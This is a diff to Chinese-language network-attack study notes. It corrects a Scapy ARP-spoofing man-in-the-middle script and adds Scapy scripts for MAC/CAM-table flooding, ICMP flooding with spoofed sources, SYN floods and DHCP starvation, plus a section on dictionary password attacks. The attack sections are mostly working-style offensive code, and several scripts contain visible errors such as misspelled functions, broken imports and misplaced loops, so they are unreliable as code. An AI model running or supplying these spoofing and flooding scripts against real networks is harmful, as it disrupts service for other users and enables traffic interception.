@@ -983,7 +983,7 @@ while 1:
 ```python
 #Scapy
 #开启中间人欺骗，需要同时对目标主机和网关都进行欺骗
-#ARP表项有生命周期，需要不断欺骗(循环 sedp(attackTarget,inter=1,loop=1))
+#ARP表项有生命周期，需要不断欺骗(循环 sendp(attackTarget,inter=1,loop=1))
 import sys
 import time
 from scapy.all import sendp,ARP,Ether
@@ -997,8 +997,8 @@ attackTarget=Ether()/ARP(psrc=gatewayIP,pdst=vimtimIP)
 #欺骗网关
 attackGateway=Ether()/ARP(psrc=vimtimIP,pdst=gatewayIP)
 #循环  inter指定时间间隔  loop=1实现循环发送
-sedp(attackTarget,inter=1,loop=1)
-sedp(attackGateway,inter=1,loop=1)
+sendp(attackTarget,inter=1,loop=1)
+sendp(attackGateway,inter=1,loop=1)
 **************************************************************
 #Socket
 #按照ARP数据包格式构造socket数据包
@@ -1035,3 +1035,129 @@ while 1:
 ```
 
 # 拒绝服务攻击
+
+#### 数据链路层DOS——二层交换机
+
+```python
+攻击目标是二层交换机
+目的是让二层交换机以一种不正常的方式工作
+
+在交换机之前，使用的是集线器(用sniffer+网卡混杂即可监听整个局域网)
+两者作用相同，均是实现局域网两个主机之间的通信
+原理不同
+简而言之，集线器没有学习和记忆的能力
+集线器的模式是广播，对应主机接收数据包，其余主机抛弃数据包
+交换机具有学习和记忆的能力，按照CAM表完成数据包转发
+当然，交换机的学习是动态的，CAM表中的表项有一个存活期(通常是5min)
+由此，交换机是单播
+
+当填满覆盖CAM表，伪造表项，此时的交换机退化成集线器，即广播数据包
+无法正常提供局域网转发
+```
+
+```python
+macof [-s src] [-d dst] [-e tha] [-x sport] [-y dport] [-i interface] [-n times]
+**************************************************************
+import sys
+from scapy.all import *
+import time
+iface = "eth0"
+iflen(sys.argv) >=2:
+    iface=sys.argv[1]
+while(1):
+    packet = Ether(src=RandMac(),dst=RandMac())/IP(src=RancIP(),dst=RandIP()) / ICMP()
+    time.sleep(0.5)
+    sendp(packet,iface=iface,loop=0)
+```
+
+#### 网络层DOS
+
+```python
+针对ICMP
+
+死亡之ping   ping 192.168.92.2 -l 65500
+同时多台计算机发送ICMP数据包
+提高发送ICMP数据包的速度
+随机地址向目标不断发送ICMP数据包(flood由正常通信的服务器发起)
+向不同地址不断发送以攻击目标的IP地址为发送地址的数据包(flood由正常通信的服务器发起)
+```
+
+```python
+import sys.random
+from scapy.all import sendp,IP,ICMP
+if len(sys.argv) < 2:
+    print sys.argv[0] + "<spoofed_source_ip> <target>"
+    sys.exit(0)
+    while (1):
+        pdst="%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
+        psrc="1.1.1.1"
+    sendp(IP(src=psrc,dst=pdst)/ICMP())
+```
+
+#### 传输层DOS
+
+```python
+TCP的DOS，出发点即是三次握手机制
+和目标端口完成三次握手
+只和目标端口完成前两次握手(SYN拒绝服务攻击)
+```
+
+```python
+import sys,random
+from scapy.all import senp,IP,TCP
+if len(sys.argv) < 2:
+    print "SynFlood.py + target IP"
+    sys.exit(0)
+while 1:
+    psrc="%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
+    pdst=argv[1]
+sendp(IP(src=psrc,dst=pdst) / TCp(dport=80,flag="S"))
+```
+
+#### 应用层DOS
+
+```python
+DHCP：集中地管理、分配IP地址，使网络环境中的主机动态获取IP地址，Gateway地址、DNS服务器地址等信息，并提高地址的使用率
+
+客户端广播DHCP Discover信息
+服务器提供地址租约Offer
+客户端选择并请求Request
+服务器确认ACK
+
+伪造大量DHVP请求报文到服务器使得DHCP服务器地址池中的IP地址被分配完毕，导致合法用户无法申请到IP地址
+同时大量的DHCP请求也会导致服务器高负荷运行，导致设备瘫痪
+```
+
+```python
+from scapy.all import srp,IP,UDP,Ether,DHCP,BOOTP
+dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0",dst="255.255.255.255") / UDP(sport=68,dport=67) / BOOTP() / DHCP(options=[("message-type","discover"),"end"])
+srp(dhcp_discover)
+```
+
+```python
+Yersinia
+Metasploit
+```
+
+# 身份认证攻击
+
+#### 字典
+
+```python
+纯字典攻击：单纯依靠字典，利用工具将用户名和字典中的密码组合，一个一个试
+混合攻击：此时需要破解的密码具有一定的强壮度，混合攻击依靠一定的算法对字典中的内容进行处理后再使用
+完全暴力攻击：实际上，不需要字典，只利用工具将密码穷举出来
+```
+
+```python
+#python生成字典
+#itertools库
+#count():产生递增的序列；count(1,5)生成从1开始的循环器，递增5，即1，6，11，16···
+#cycle():重复序列中的元素；cycle('hello')即h,e,l,l,o,h,e,l,l,o,h···
+#repeat():重复元素，构成无穷循环器；repeat(1)即1，1，1，1，1···
+#product():获得多个循环器的笛卡尔积；product('xyz',[0,1])即x0,y0,z0,x1,y1,z1
+#permutations('abcd',2):从abcd中挑选两个元素，例如ab,bc,将所有结果排序，返回为新的循环器，且这些组合是有顺序的，即c和d能生成cd和dc
+#combinations('abcd',2):从abcd中挑选两个元素，例如ab,bc,将所有结果排序，返回为新的循环器，且这些组合是无序的，即c和d只能生成cd
+
+```
+
